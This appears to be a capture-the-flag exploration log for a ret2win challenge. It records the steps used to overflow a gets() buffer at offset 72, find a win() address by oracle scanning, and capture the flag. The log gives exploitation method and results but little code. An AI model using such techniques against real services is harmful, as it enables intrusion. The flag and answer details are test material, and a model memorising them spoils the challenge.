# Kuiper Belt Relay Core — Exploration Log

## H1 — Boundary detection via output termination

**cmd:** `python fine.py` (scan offsets 63–96)

**evidence:**
```
n= 63 echoedA= 63 gb=1 extra_hex=b'0a476f6f64627965210a'
n= 64 echoedA= 64 gb=1 extra_hex=b'0a476f6f64627965210a'
...
n= 71 echoedA= 71 gb=1 extra_hex=b'0a476f6f64627965210a'
n= 72 echoedA= 72 gb=0 extra_hex=b'0a'
n= 73 echoedA= 73 gb=0 extra_hex=b'0a'
n= 74 echoedA= 74 gb=0 extra_hex=b'0a'
```

**result:** PASS — Return address boundary confirmed at offset 72 (64 buffer + 8 saved RBP).

---

## H2 — Stack leak attempt via printf format string

**cmd:** Attempt `b"A"*n + b"%s%s%s..."` pattern to leak stack bytes after echoed buffer

**evidence:** All A's up to expected ret address, then NUL or garbage. No meaningful addresses observed.

**result:** DEAD - NUL terminator from gets()

`gets()` writes `\x00` immediately after user input. With 64-bit addresses starting at 0x40xxxxxx, writing the low byte first causes `gets()` to inject NUL exactly at LSB(return_address), truncating any subsequent `%s` read. Not a sign of null bytes in memory — inherent behavior of gets().

Alternative approach: oracle-based scanning on live service (confirmed successful).

---

## H3 — Oracle-based scanning for win() address

**cmd:** `python sweep.py sanity` (test known addresses)  
**cmd:** `python sweep.py 64` (full range 0x401000–0x401500)

**evidence:** Workers probed candidate addresses as 3-byte payloads (low-endian truncated at NUL). Addresses < 0x1000000 require only 3 bytes.

Oracle hit: "hijacked" + flag text in response.

**result:** HIT — win() = 0x401216

Confirmed by 3/3 reproducibility runs.

---

## H4 — Final payload construction and verification

**cmd:** `python exploit.py` (3 consecutive runs)

**evidence:** Each run returns:
```
You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

**result:** PASS — Exploit reproducible, flag captured consistently.

---

## Summary

| Step | Action | Result | Notes |
|------|--------|--------|-------|
| H1 | Boundary detection | PASS | Offset 72 = 64 buffer + 8 saved RBP |
| H2 | Stack leak attempt | DEAD | gets() NUL terminates early |
| H3 | Oracle scanning | HIT | win() = 0x401216 |
| H4 | Verify exploit | PASS | 3/3 success rate |

Binary characteristics:
- Architecture: x86-64
- PIE: no (fixed text segment at 0x40xxxx)
- Mitigations: none visible (no canary, no NX evident)
- Vulnerability: unsafe gets() with no bounds checking
